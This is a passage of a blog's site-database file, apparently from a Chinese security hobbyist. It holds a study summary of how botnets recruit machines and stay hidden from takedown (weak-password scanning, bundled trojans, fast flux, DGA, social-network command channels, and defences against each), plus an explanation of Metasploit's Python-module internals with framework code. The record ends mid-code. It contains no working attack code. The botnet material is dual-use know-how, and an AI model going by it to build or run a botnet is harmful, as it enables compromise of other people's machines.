min.js","hash":"7d3a9c937317b9c15f2c3a872f0e26607a729458","modified":1533665613358},{"_id":"public/live2dw/lib/L2Dwidget.min.js.map","hash":"5e7669733ecd0b1bc3881d2cf7fcc01e2990a07d","modified":1533665615427},{"_id":"public/imgs/slide/background6.jpg","hash":"da471d9801cf963ebf566341d1bea1483d81e435","modified":1533665615427},{"_id":"public/imgs/preview/preview2.jpg","hash":"84a1b22a5b11c77159495d3b0b1c707a02287796","modified":1533665615427},{"_id":"public/imgs/preview/preview3.jpg","hash":"e74e2c5baec4b447d0253bfbb223e8619a58ebb8","modified":1533665615429},{"_id":"public/imgs/slide/background1.jpg","hash":"494fcbd2414a8b1d96d010bc7f2c53bfc2eb2156","modified":1533665617664},{"_id":"public/fonts/fontawesome-webfont.svg","hash":"b5483b11f8ba213e733b5b8af9927a04fec996f6","modified":1533665618463},{"_id":"public/live2dw/lib/L2Dwidget.0.min.js.map","hash":"09521263ecc625a246b3406c385300e99e966a2e","modified":1533665618522},{"_id":"public/imgs/preview/preview5.jpg","hash":"863d22d2d686e1428607ff97d5464b3d162cac30","modified":1533665618670},{"_id":"public/imgs/preview/preview6.jpg","hash":"e67e13ca86d0797c89b9cfd488fd3a2804e73e3d","modified":1533665618880}],"Category":[{"name":"网络安全","_id":"cjkk0wi44000br4nx3wan86n0"}],"Data":[],"Page":[{"title":"about","date":"2018-07-26T07:23:27.000Z","_content":"\n死肥宅 网络安全爱好者 入门级编程\n","source":"about/index.md","raw":"---\ntitle: about\ndate: 2018-07-26 15:23:27\n---\n\n死肥宅 网络安全爱好者 入门级编程\n","updated":"2018-07-26T07:25:21.045Z","path":"about/index.html","comments":1,"layout":"page","_id":"cjkk0whzm0000r4nxw1abehte","content":"<p>死肥宅 网络安全爱好者 入门级编程</p>\n","site":{"data":{}},"excerpt":"","more":"<p>死肥宅 网络安全爱好者 入门级编程</p>\n"},{"title":"404","date":"2018-07-26T05:56:55.000Z","_content":"","source":"404/index.md","raw":"---\ntitle: 404\ndate: 2018-07-26 13:56:55\n---\n","updated":"2018-07-26T05:56:55.877Z","path":"404/index.html","comments":1,"layout":"page","_id":"cjkk0wi0o0002r4nxj1xb10tk","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"categories","date":"2018-07-26T07:14:00.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2018-07-26 15:14:00\ntype: \"categories\"\n---\n","updated":"2018-07-26T07:14:42.699Z","path":"categories/index.html","comments":1,"layout":"page","_id":"cjkk0wi1x0004r4nxzh6ys9p9","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2018-07-26T07:16:29.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2018-07-26 15:16:29\ntype: \"tags\"\n---\n","updated":"2018-07-26T12:45:14.727Z","path":"tags/index.html","comments":1,"layout":"page","_id":"cjkk0wi2t0007r4nx0pf2va5w","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"search","date":"2018-07-26T05:56:47.000Z","_content":"","source":"search/index.md","raw":"---\ntitle: search\ndate: 2018-07-26 13:56:47\n---\n","updated":"2018-07-26T05:56:47.757Z","path":"search/index.html","comments":1,"layout":"page","_id":"cjkk0wi3i0009r4nx1yq6p4rm","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"僵尸网络","date":"2018-08-07T14:24:14.000Z","_content":"此文是学习的一些自我总结\n\n### 僵尸网络\n僵尸网络是由众多肉鸡和网络控制者组成，网络控制者通过传播木马,漏洞利用等途径抓肉鸡，并通过命令服务器控制整个网络.\n\n### 传播方法\n#### 弱口令\n最简单（辣鸡）的方法就是通过服务器弱口令，使用一些类似nmap，zmap全网扫描 再使用一些爆破工具 如Hydra. 操作简单，但是成功率非常小.\n\\*随着物联网的发展 用户对物联网设备的疏忽大意 导致现在出现了大量IoT僵尸网络\n\n#### 传播木马\n一些下载站捆绑的软件就是木马 下载完就变成肉鸡了.或者提供一些类似于黑客工具 用捆绑木马骗小白们下载. 这种方式操作复制 因为让别人下载并运行也不是一件容易的事，但是如果免杀做得好 成功率基本100%\n\n#### 远程攻击\n通过收集一些rce exp 在全网搜索引擎找到合适目标 进行攻击。操作也简单，成功率很高.但是能成功的数量可能不多，还是万人骑\n\n\n### 获取命令渠道\n IPC->HTTP/DNS->社交网络\n\nIPC 通过IPC频道下发命令\nHTTP/DNS 通过http请求/dns请求来下发命令\n社交网络  通过qq空间/推特推文之类下发命令\n\n可以发现是越来越隐蔽的 防火墙从屏蔽IPC到屏蔽域名/ip 但一般不可能把推特/qq也给屏蔽掉\n\n### 僵尸网络的攻与防\n打击僵尸网络从僵尸网络诞生就没停止过，僵尸网络技术与检测技术都是不断发展\n\n#### 终端攻防\n安全软件/服务供应商(如云供应商)可以将木马检测删除.\n\n但成熟的木马都做了随时代发展的混淆/免杀 难以查杀 以及用户安全意识不强 点信任此软件导致防御失败\n\n#### 下发命令渠道\n通过防火墙将检测出来的僵尸网络请求拦截，传统方法是通过人工定的规则.随着机器学习的技术的发展 通过机器/深度学习来检测僵尸网络的技术发展了起来 但是并没有有足以商用的，因为网络请求0.1误报率就足以让人不去使用 但可以期待以后通过机器/深度学习将僵尸网络通信拦截.\n\n获取命令渠道一直在发展 像通过社交网络的渠道去获得命令 防火墙完全不可能查出来\n\n\n#### 命令服务器\n通过向IP提供商/云服务器供应商/域名供应商投诉 使命令服务器关闭 破坏僵尸网络\n\n> 僵尸网络的命令服务器网络结构发展\n  中心化(单命令服务器)->中心化(多命令服务器)->星形(多命令服务器,分别负责一部分)=网状(p2p 无命令服务器 bot之间平权)\n  逐渐不再中心化 减轻了命令服务器被破坏导致僵尸网络的破坏\n\n> fast flux\n传统上通过使用循环dns (为单个域名 返回多ip)并频繁更换dns记录的ip地址  可以隐藏背后真实的ip地址 就算被发现了并封停 也通过更换dns记录的ip保持僵尸网络。 缺点显然是需要域名不被封停，因为注册服务商不愿意这样做  可能因为是他们的主要客户并且所在地区无法律要求封停\n\n> DGA\n通过使用一些随机种子和域名生成算法(DGA)生成大量域名 并作为命令服务器。 作者提前注册。由于生成的大量域名难以全加到防火墙规则和封停和购买域名成本并不高 是一种有效防止封停命令服务器的方法。但使用机器学习检测DGA已经逐渐成熟，将来很可能会被防火墙拦截.\n如果作者没有全部注册 可能导致抢注域名 （需要逆向分析出dga算法和服务器端算法）\n\n> 社交网络\n在社交网络 举报成功或者联系客服都能使得账号被封停。 在前沿领域已经有人使用了类似与DGA的用户生成算法\n\n\n#### 作者\n虽然几率比较小 但是还是有的 [史上最强僵尸网络 Mirai 真凶被抓](https://www.leiphone.com/news/201712/Zh27v3v2MggYZNul.html)\n","source":"_posts/botnet.md","raw":"---\ntitle: 僵尸网络\ndate: 2018-08-07 22:24:14\ntags:\n---\n此文是学习的一些自我总结\n\n### 僵尸网络\n僵尸网络是由众多肉鸡和网络控制者组成，网络控制者通过传播木马,漏洞利用等途径抓肉鸡，并通过命令服务器控制整个网络.\n\n### 传播方法\n#### 弱口令\n最简单（辣鸡）的方法就是通过服务器弱口令，使用一些类似nmap，zmap全网扫描 再使用一些爆破工具 如Hydra. 操作简单，但是成功率非常小.\n\\*随着物联网的发展 用户对物联网设备的疏忽大意 导致现在出现了大量IoT僵尸网络\n\n#### 传播木马\n一些下载站捆绑的软件就是木马 下载完就变成肉鸡了.或者提供一些类似于黑客工具 用捆绑木马骗小白们下载. 这种方式操作复制 因为让别人下载并运行也不是一件容易的事，但是如果免杀做得好 成功率基本100%\n\n#### 远程攻击\n通过收集一些rce exp 在全网搜索引擎找到合适目标 进行攻击。操作也简单，成功率很高.但是能成功的数量可能不多，还是万人骑\n\n\n### 获取命令渠道\n IPC->HTTP/DNS->社交网络\n\nIPC 通过IPC频道下发命令\nHTTP/DNS 通过http请求/dns请求来下发命令\n社交网络  通过qq空间/推特推文之类下发命令\n\n可以发现是越来越隐蔽的 防火墙从屏蔽IPC到屏蔽域名/ip 但一般不可能把推特/qq也给屏蔽掉\n\n### 僵尸网络的攻与防\n打击僵尸网络从僵尸网络诞生就没停止过，僵尸网络技术与检测技术都是不断发展\n\n#### 终端攻防\n安全软件/服务供应商(如云供应商)可以将木马检测删除.\n\n但成熟的木马都做了随时代发展的混淆/免杀 难以查杀 以及用户安全意识不强 点信任此软件导致防御失败\n\n#### 下发命令渠道\n通过防火墙将检测出来的僵尸网络请求拦截，传统方法是通过人工定的规则.随着机器学习的技术的发展 通过机器/深度学习来检测僵尸网络的技术发展了起来 但是并没有有足以商用的，因为网络请求0.1误报率就足以让人不去使用 但可以期待以后通过机器/深度学习将僵尸网络通信拦截.\n\n获取命令渠道一直在发展 像通过社交网络的渠道去获得命令 防火墙完全不可能查出来\n\n\n#### 命令服务器\n通过向IP提供商/云服务器供应商/域名供应商投诉 使命令服务器关闭 破坏僵尸网络\n\n> 僵尸网络的命令服务器网络结构发展\n  中心化(单命令服务器)->中心化(多命令服务器)->星形(多命令服务器,分别负责一部分)=网状(p2p 无命令服务器 bot之间平权)\n  逐渐不再中心化 减轻了命令服务器被破坏导致僵尸网络的破坏\n\n> fast flux\n传统上通过使用循环dns (为单个域名 返回多ip)并频繁更换dns记录的ip地址  可以隐藏背后真实的ip地址 就算被发现了并封停 也通过更换dns记录的ip保持僵尸网络。 缺点显然是需要域名不被封停，因为注册服务商不愿意这样做  可能因为是他们的主要客户并且所在地区无法律要求封停\n\n> DGA\n通过使用一些随机种子和域名生成算法(DGA)生成大量域名 并作为命令服务器。 作者提前注册。由于生成的大量域名难以全加到防火墙规则和封停和购买域名成本并不高 是一种有效防止封停命令服务器的方法。但使用机器学习检测DGA已经逐渐成熟，将来很可能会被防火墙拦截.\n如果作者没有全部注册 可能导致抢注域名 （需要逆向分析出dga算法和服务器端算法）\n\n> 社交网络\n在社交网络 举报成功或者联系客服都能使得账号被封停。 在前沿领域已经有人使用了类似与DGA的用户生成算法\n\n\n#### 作者\n虽然几率比较小 但是还是有的 [史上最强僵尸网络 Mirai 真凶被抓](https://www.leiphone.com/news/201712/Zh27v3v2MggYZNul.html)\n","slug":"botnet","published":1,"updated":"2018-08-07T18:13:04.298Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjkk0whzw0001r4nx4211yia8","content":"<p>此文是学习的一些自我总结</p>\n<h3 id=\"僵尸网络\"><a href=\"#僵尸网络\" class=\"headerlink\" title=\"僵尸网络\"></a>僵尸网络</h3><p>僵尸网络是由众多肉鸡和网络控制者组成，网络控制者通过传播木马,漏洞利用等途径抓肉鸡，并通过命令服务器控制整个网络.</p>\n<h3 id=\"传播方法\"><a href=\"#传播方法\" class=\"headerlink\" title=\"传播方法\"></a>传播方法</h3><h4 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h4><p>最简单（辣鸡）的方法就是通过服务器弱口令，使用一些类似nmap，zmap全网扫描 再使用一些爆破工具 如Hydra. 操作简单，但是成功率非常小.<br>*随着物联网的发展 用户对物联网设备的疏忽大意 导致现在出现了大量IoT僵尸网络</p>\n<h4 id=\"传播木马\"><a href=\"#传播木马\" class=\"headerlink\" title=\"传播木马\"></a>传播木马</h4><p>一些下载站捆绑的软件就是木马 下载完就变成肉鸡了.或者提供一些类似于黑客工具 用捆绑木马骗小白们下载. 这种方式操作复制 因为让别人下载并运行也不是一件容易的事，但是如果免杀做得好 成功率基本100%</p>\n<h4 id=\"远程攻击\"><a href=\"#远程攻击\" class=\"headerlink\" title=\"远程攻击\"></a>远程攻击</h4><p>通过收集一些rce exp 在全网搜索引擎找到合适目标 进行攻击。操作也简单，成功率很高.但是能成功的数量可能不多，还是万人骑</p>\n<h3 id=\"获取命令渠道\"><a href=\"#获取命令渠道\" class=\"headerlink\" title=\"获取命令渠道\"></a>获取命令渠道</h3><p> IPC-&gt;HTTP/DNS-&gt;社交网络</p>\n<p>IPC 通过IPC频道下发命令<br>HTTP/DNS 通过http请求/dns请求来下发命令<br>社交网络  通过qq空间/推特推文之类下发命令</p>\n<p>可以发现是越来越隐蔽的 防火墙从屏蔽IPC到屏蔽域名/ip 但一般不可能把推特/qq也给屏蔽掉</p>\n<h3 id=\"僵尸网络的攻与防\"><a href=\"#僵尸网络的攻与防\" class=\"headerlink\" title=\"僵尸网络的攻与防\"></a>僵尸网络的攻与防</h3><p>打击僵尸网络从僵尸网络诞生就没停止过，僵尸网络技术与检测技术都是不断发展</p>\n<h4 id=\"终端攻防\"><a href=\"#终端攻防\" class=\"headerlink\" title=\"终端攻防\"></a>终端攻防</h4><p>安全软件/服务供应商(如云供应商)可以将木马检测删除.</p>\n<p>但成熟的木马都做了随时代发展的混淆/免杀 难以查杀 以及用户安全意识不强 点信任此软件导致防御失败</p>\n<h4 id=\"下发命令渠道\"><a href=\"#下发命令渠道\" class=\"headerlink\" title=\"下发命令渠道\"></a>下发命令渠道</h4><p>通过防火墙将检测出来的僵尸网络请求拦截，传统方法是通过人工定的规则.随着机器学习的技术的发展 通过机器/深度学习来检测僵尸网络的技术发展了起来 但是并没有有足以商用的，因为网络请求0.1误报率就足以让人不去使用 但可以期待以后通过机器/深度学习将僵尸网络通信拦截.</p>\n<p>获取命令渠道一直在发展 像通过社交网络的渠道去获得命令 防火墙完全不可能查出来</p>\n<h4 id=\"命令服务器\"><a href=\"#命令服务器\" class=\"headerlink\" title=\"命令服务器\"></a>命令服务器</h4><p>通过向IP提供商/云服务器供应商/域名供应商投诉 使命令服务器关闭 破坏僵尸网络</p>\n<blockquote>\n<p>僵尸网络的命令服务器网络结构发展<br>  中心化(单命令服务器)-&gt;中心化(多命令服务器)-&gt;星形(多命令服务器,分别负责一部分)=网状(p2p 无命令服务器 bot之间平权)<br>  逐渐不再中心化 减轻了命令服务器被破坏导致僵尸网络的破坏</p>\n</blockquote>\n<blockquote>\n<p>fast flux<br>传统上通过使用循环dns (为单个域名 返回多ip)并频繁更换dns记录的ip地址  可以隐藏背后真实的ip地址 就算被发现了并封停 也通过更换dns记录的ip保持僵尸网络。 缺点显然是需要域名不被封停，因为注册服务商不愿意这样做  可能因为是他们的主要客户并且所在地区无法律要求封停</p>\n</blockquote>\n<blockquote>\n<p>DGA<br>通过使用一些随机种子和域名生成算法(DGA)生成大量域名 并作为命令服务器。 作者提前注册。由于生成的大量域名难以全加到防火墙规则和封停和购买域名成本并不高 是一种有效防止封停命令服务器的方法。但使用机器学习检测DGA已经逐渐成熟，将来很可能会被防火墙拦截.<br>如果作者没有全部注册 可能导致抢注域名 （需要逆向分析出dga算法和服务器端算法）</p>\n</blockquote>\n<blockquote>\n<p>社交网络<br>在社交网络 举报成功或者联系客服都能使得账号被封停。 在前沿领域已经有人使用了类似与DGA的用户生成算法</p>\n</blockquote>\n<h4 id=\"作者\"><a href=\"#作者\" class=\"headerlink\" title=\"作者\"></a>作者</h4><p>虽然几率比较小 但是还是有的 <a href=\"https://www.leiphone.com/news/201712/Zh27v3v2MggYZNul.html\" target=\"_blank\" rel=\"noopener\">史上最强僵尸网络 Mirai 真凶被抓</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>此文是学习的一些自我总结</p>\n<h3 id=\"僵尸网络\"><a href=\"#僵尸网络\" class=\"headerlink\" title=\"僵尸网络\"></a>僵尸网络</h3><p>僵尸网络是由众多肉鸡和网络控制者组成，网络控制者通过传播木马,漏洞利用等途径抓肉鸡，并通过命令服务器控制整个网络.</p>\n<h3 id=\"传播方法\"><a href=\"#传播方法\" class=\"headerlink\" title=\"传播方法\"></a>传播方法</h3><h4 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h4><p>最简单（辣鸡）的方法就是通过服务器弱口令，使用一些类似nmap，zmap全网扫描 再使用一些爆破工具 如Hydra. 操作简单，但是成功率非常小.<br>*随着物联网的发展 用户对物联网设备的疏忽大意 导致现在出现了大量IoT僵尸网络</p>\n<h4 id=\"传播木马\"><a href=\"#传播木马\" class=\"headerlink\" title=\"传播木马\"></a>传播木马</h4><p>一些下载站捆绑的软件就是木马 下载完就变成肉鸡了.或者提供一些类似于黑客工具 用捆绑木马骗小白们下载. 这种方式操作复制 因为让别人下载并运行也不是一件容易的事，但是如果免杀做得好 成功率基本100%</p>\n<h4 id=\"远程攻击\"><a href=\"#远程攻击\" class=\"headerlink\" title=\"远程攻击\"></a>远程攻击</h4><p>通过收集一些rce exp 在全网搜索引擎找到合适目标 进行攻击。操作也简单，成功率很高.但是能成功的数量可能不多，还是万人骑</p>\n<h3 id=\"获取命令渠道\"><a href=\"#获取命令渠道\" class=\"headerlink\" title=\"获取命令渠道\"></a>获取命令渠道</h3><p> IPC-&gt;HTTP/DNS-&gt;社交网络</p>\n<p>IPC 通过IPC频道下发命令<br>HTTP/DNS 通过http请求/dns请求来下发命令<br>社交网络  通过qq空间/推特推文之类下发命令</p>\n<p>可以发现是越来越隐蔽的 防火墙从屏蔽IPC到屏蔽域名/ip 但一般不可能把推特/qq也给屏蔽掉</p>\n<h3 id=\"僵尸网络的攻与防\"><a href=\"#僵尸网络的攻与防\" class=\"headerlink\" title=\"僵尸网络的攻与防\"></a>僵尸网络的攻与防</h3><p>打击僵尸网络从僵尸网络诞生就没停止过，僵尸网络技术与检测技术都是不断发展</p>\n<h4 id=\"终端攻防\"><a href=\"#终端攻防\" class=\"headerlink\" title=\"终端攻防\"></a>终端攻防</h4><p>安全软件/服务供应商(如云供应商)可以将木马检测删除.</p>\n<p>但成熟的木马都做了随时代发展的混淆/免杀 难以查杀 以及用户安全意识不强 点信任此软件导致防御失败</p>\n<h4 id=\"下发命令渠道\"><a href=\"#下发命令渠道\" class=\"headerlink\" title=\"下发命令渠道\"></a>下发命令渠道</h4><p>通过防火墙将检测出来的僵尸网络请求拦截，传统方法是通过人工定的规则.随着机器学习的技术的发展 通过机器/深度学习来检测僵尸网络的技术发展了起来 但是并没有有足以商用的，因为网络请求0.1误报率就足以让人不去使用 但可以期待以后通过机器/深度学习将僵尸网络通信拦截.</p>\n<p>获取命令渠道一直在发展 像通过社交网络的渠道去获得命令 防火墙完全不可能查出来</p>\n<h4 id=\"命令服务器\"><a href=\"#命令服务器\" class=\"headerlink\" title=\"命令服务器\"></a>命令服务器</h4><p>通过向IP提供商/云服务器供应商/域名供应商投诉 使命令服务器关闭 破坏僵尸网络</p>\n<blockquote>\n<p>僵尸网络的命令服务器网络结构发展<br>  中心化(单命令服务器)-&gt;中心化(多命令服务器)-&gt;星形(多命令服务器,分别负责一部分)=网状(p2p 无命令服务器 bot之间平权)<br>  逐渐不再中心化 减轻了命令服务器被破坏导致僵尸网络的破坏</p>\n</blockquote>\n<blockquote>\n<p>fast flux<br>传统上通过使用循环dns (为单个域名 返回多ip)并频繁更换dns记录的ip地址  可以隐藏背后真实的ip地址 就算被发现了并封停 也通过更换dns记录的ip保持僵尸网络。 缺点显然是需要域名不被封停，因为注册服务商不愿意这样做  可能因为是他们的主要客户并且所在地区无法律要求封停</p>\n</blockquote>\n<blockquote>\n<p>DGA<br>通过使用一些随机种子和域名生成算法(DGA)生成大量域名 并作为命令服务器。 作者提前注册。由于生成的大量域名难以全加到防火墙规则和封停和购买域名成本并不高 是一种有效防止封停命令服务器的方法。但使用机器学习检测DGA已经逐渐成熟，将来很可能会被防火墙拦截.<br>如果作者没有全部注册 可能导致抢注域名 （需要逆向分析出dga算法和服务器端算法）</p>\n</blockquote>\n<blockquote>\n<p>社交网络<br>在社交网络 举报成功或者联系客服都能使得账号被封停。 在前沿领域已经有人使用了类似与DGA的用户生成算法</p>\n</blockquote>\n<h4 id=\"作者\"><a href=\"#作者\" class=\"headerlink\" title=\"作者\"></a>作者</h4><p>虽然几率比较小 但是还是有的 <a href=\"https://www.leiphone.com/news/201712/Zh27v3v2MggYZNul.html\" target=\"_blank\" rel=\"noopener\">史上最强僵尸网络 Mirai 真凶被抓</a></p>\n"},{"title":"metasploit python 模块是如何运行","date":"2018-02-05T01:33:23.000Z","_content":"## 开始\nmetasploit的扩展实现的代码主要在`metasploit-framework/lib/msf/core/modules/external\n`\n目录结构如下\n~~~\n├── bridge.rb\n├── message.rb\n├── python\n│   ├── async_timeout\n│   │   ├── __init__.py\n│   └── metasploit\n│       ├── __init__.py\n│       ├── __init__.pyc\n│       ├── module.py\n│       ├── module.pyc\n│       ├── probe_scanner.py\n├── shim.rb\n└── templates\n    ├── capture_server.erb\n    ├── common_metadata.erb\n    ├── dos.erb\n    ├── multi_scanner.erb\n    └── remote_exploit_cmd_stager.erb\n\n~~~\n\n其中`python`目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入`metasploit`\n`templates`目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如`info`都是靠这些模板实现的.\n`message.rb`和`bridge`是与msf jsonrpc通信的一些api.\n`shim.rb`则是真正将python代码实现为模块的代码.\n\n这里省略了不重要的细节的`message.rb`代码\n~~~\nclass Msf::Modules::External::Message\n \n  def self.from_module(j)                                                                                        \n    if j['method']\n      m = self.new(j['method'].to_sym)\n      m.params = j['params']\n      m\n    elsif j['response']\n      m = self.new(:reply)\n      m.params = j['response']\n      m.id = j['id']\n      m\n    end\n  end\n \n  def initialize(m)\n    self.method = m\n    self.params = {}\n    self.id = Base64.strict_encode64(SecureRandom.random_bytes(16))\n  end\n \n  def to_json\n    params =\n      if self.params.respond_to? :to_nested_values\n        self.params.to_nested_values\n      else\n        self.params.to_h\n      end\n    JSON.generate({jsonrpc: '2.0', id: self.id, method: self.method, params: params})\n  end\n\n~~~\n这个类实际上是对传递给metasploit的信息的一个封装.\n`initialize`是ruby的初始化方法 从这里可以看到它有三个属性`method` `params` `id` \n\n`from_module`方法则是用于将传递的参数转换成自身\n`to_json`方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式)\n\n这里是省略了不重要的细节的`bridge.rb`代码\n~~~\nrequire 'msf/core/modules/external/message'\n\nclass Msf::Modules::External::Bridge\n  \n  # 通过jsonrpc运行\n  def run(datastore)\n    unless self.running\n      m = Msf::Modules::External::Message.new(:run)\n      m.params = datastore.dup\n      send(m)\n      self.running = true\n    end\n  end\n\t\n  # 获取当前状态和恢复run状态  \n  def get_status\n    if self.running || !self.messages.empty?\n      m = receive_notification\n      if m.nil?\n        close_ios\n        self.messages.close\n        self.running = false\n      end\n\n      return m\n    end\n  end\n  \n  # 接收\n  def recv(filter_id=nil, timeout=600)\n    _, out, err = self.ios\n    message = ''\n  \n  # jsonrpc发送和接受\n  def send_receive(message)\n    send(message)\n    recv(message.id)\n  end\n  \n  # 发送模块元数据\n  def describe\n    resp = send_receive(Msf::Modules::External::Message.new(:describe))\n    close_ios\n    resp.params\n  end\n  \t\n  # 发送  \n  def send(message)\n    input, output, err, status = ::Open3.popen3(self.env, self.cmd)\n    self.ios = [input, output, err]\n    self.wait_thread = status\n    case select(nil, [input], nil, 0.1)\n    when nil\n      raise \"Cannot run module #{self.path}\"\n    when [[], [input], []]\n      m = message.to_json\n      write_message(input, m)\n    else\n      raise \"Error running module #{self.path}\"\n    end\n  end\n  \n  # TODO 这里原本有一大段关于网络接受的代码 \n\n# 每个编程语言扩展的具体实现\nclass Msf::Modules::External::PyBridge < Msf::Modules::External::Bridge\n # 判断是否是py文件\n  def self.applies?(module_name)\n    module_name.match? /\\.py$/\n  end\n \n  # 初始化 python扩展添加了额外的路径\n  def initialize(module_path)\n    super\n    pythonpath = ENV['PYTHONPATH'] || ''\n    self.env = self.env.merge({ 'PYTHONPATH' => pythonpath + File::PATH_SEPARATOR + File.expand_path('../python', __FILE__) })\n  end\nend\n\n\nclass Msf::Modules::External::Bridge\n  # 载入列表 我们可以期待更多的语言可以编写msf模块 如Msf::Modules::External::JsBridge?\n  LOADERS = [\n    Msf::Modules::External::PyBridge,\n    Msf::Modules::External::Bridge\n  ]\n\t\n  # 运行模块方法 让载入的bridge都判断是否是自己所属的 \n  def self.open(module_path)\n    LOADERS.each do |klass|\n      return klass.new module_path if klass.applies? module_path\n    end\n    nil\n  end\nend\n~~~\n\n\n这里是省略了不重要的细节的`shim.rb`代码\n~~~\nrequire 'msf/core/modules/external/bridge'\n\nclass Msf::Modules::External::Shim\n  # 将bridge返回的数据生成一个模块\n  def self.generate(module_path)\n    mod = Msf::Modules::External::Bridge.open(module_path)\n    return '' unless mod.meta\n    # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 \n    case mod.meta['type']\n    when 'remote_exploit_cmd_stager'\n      remote_exploit_cmd_stager(mod)\n    when 'capture_server'\n      capture_server(mod)\n    when 'dos'\n      dos(mod)\n    when 'scanner.multi'\n      multi_scanner(mod)\n    else\n      # TODO have a nice load error show up in the logs\n      ''\n    end\n  end\n  \n  # 返回一个模块 erb是ruby的一个代码模板库\n  def self.render_template(name, meta = {})\n    template = File.join(File.dirname(__FILE__), 'templates', name)\n    ERB.new(File.read(template)).result(binding)\n  end\n\n  def self.common_metadata(meta = {})\n    render_template('common_metadata.erb', meta)\n  end\n  \n  # 数据转换\n  def self.mod_meta_common(mod, meta = {})\n    meta[:path]        = mod.path.dump\n    meta[:name]        = mod.meta['name'].dump\n    meta[:description] = mod.meta['description'].dump\n    meta[:authors]     = mod.meta['authors'].map(&:dump).join(\",\\n          \")\n\n    meta[:options]     = mod.meta['options'].map do |n, o|\n      \"Opt#{o['type'].camelize}.new(#{n.dump},\n        [#{o['required']}, #{o['description'].dump}, #{o['default'].inspect}])\"\n    end.join(\",\\n          \")\n    meta\n  end\n\n # 渲染膜拜\n  def self.dos(mod)\n    meta = mod_meta_common(mod)\n    meta[:date] = mod.meta['date'].dump\n    meta[:references] = mod.meta['references'].map do |r|\n      \"[#{r['type'].upcase.dump}, #{r['ref'].dump}]\"\n    end.join(\",\\n          \")\n    render_template('dos.erb', meta)\n  end\nend\n\n~~~\n\n所以python模块的运行过程其实是这样的\n1. class Msf::Modules::External::Shim获取到了模块路径\n2. 调用Msf::Modules::External::Bridge.open\n3.  在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块)\n4.  初始化一个Msf::Modules::External::PyBridge并返回\n5.  判断元数据类型 假设是dos 则调用dos方法\n6.  调用mod_meta_common方法转换元数据 渲染代码模板\n\n我们可以查看`dos.erb`的内容\n~~~\nrequire 'msf/core/modules/external/bridge'\nrequire 'msf/core/module/external'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Module::External\n  include Msf::Auxiliary::Dos\n\n  def initialize\n    super({\n\t  <%= common_metadata meta %>\n      'References'  =>\n        [\n          <%= meta[:references] %>\n        ],\n      'DisclosureDate' => <%= meta[:date] %>,\n      })\n\n      register_options([\n        <%= meta[:options] %>\n      ])\n  end\n\n  def run\n    print_status(\"Starting server...\")\n    mod = Msf::Modules::External::Bridge.open(<%= meta[:path] %>)\n    mod.run(datastore)\n    wait_status(mod)\n  end\nend\n~~~\n所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在\n~~~\nmod = Msf::Modules::External::Bridge.open(<%= meta[:path] %>)\nmod.run(datastore)\n~~~\n最后通过`bridge.run`调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好\n","source":"_posts/metasploit-python-模块是如何运行.md","raw":"---\ntitle: metasploit python 模块是如何运行\ndate:  2018-2-05 09:33:23\ntags:\n\t编程技术 \n---\n## 开始\nmetasploit的扩展实现的代码主要在`metasploit-framework/lib/msf/core/modules/external\n`\n目录结构如下\n~~~\n├── bridge.rb\n├── message.rb\n├── python\n│   ├── async_timeout\n│   │   ├── __init__.py\n│   └── metasploit\n│       ├── __init__.py\n│       ├── __init__.pyc\n│       ├── module.py\n│       ├── module.pyc\n│       ├── probe_scanner.py\n├── shim.rb\n└── templates\n    ├── capture_server.erb\n    ├── common_metadata.erb\n    ├── dos.erb\n    ├── multi_scanner.erb\n    └── remote_exploit_cmd_stager.erb\n\n~~~\n\n其中`python`目录的py代码将会在我们运行python模块时加入python路径.这也是为什么我们能导入`metasploit`\n`templates`目录则是用于实现将python代码变成模块的代码模板.事实上我们能使用msf对正常模块的功能 如`info`都是靠这些模板实现的.\n`message.rb`和`bridge`是与msf jsonrpc通信的一些api.\n`shim.rb`则是真正将python代码实现为模块的代码.\n\n这里省略了不重要的细节的`message.rb`代码\n~~~\nclass Msf::Modules::External::Message\n \n  def self.from_module(j)                                                                                        \n    if j['method']\n      m = self.new(j['method'].to_sym)\n      m.params = j['params']\n      m\n    elsif j['response']\n      m = self.new(:reply)\n      m.params = j['response']\n      m.id = j['id']\n      m\n    end\n  end\n \n  def initialize(m)\n    self.method = m\n    self.params = {}\n    self.id = Base64.strict_encode64(SecureRandom.random_bytes(16))\n  end\n \n  def to_json\n    params =\n      if self.params.respond_to? :to_nested_values\n        self.params.to_nested_values\n      else\n        self.params.to_h\n      end\n    JSON.generate({jsonrpc: '2.0', id: self.id, method: self.method, params: params})\n  end\n\n~~~\n这个类实际上是对传递给metasploit的信息的一个封装.\n`initialize`是ruby的初始化方法 从这里可以看到它有三个属性`method` `params` `id` \n\n`from_module`方法则是用于将传递的参数转换成自身\n`to_json`方法很明显就是转换成一个可用的json(jsonrpc传递需要json格式)\n\n这里是省略了不重要的细节的`bridge.rb`代码\n~~~\nrequire 'msf/core/modules/external/message'\n\nclass Msf::Modules::External::Bridge\n  \n  # 通过jsonrpc运行\n  def run(datastore)\n    unless self.running\n      m = Msf::Modules::External::Message.new(:run)\n      m.params = datastore.dup\n      send(m)\n      self.running = true\n    end\n  end\n\t\n  # 获取当前状态和恢复run状态  \n  def get_status\n    if self.running || !self.messages.empty?\n      m = receive_notification\n      if m.nil?\n        close_ios\n        self.messages.close\n        self.running = false\n      end\n\n 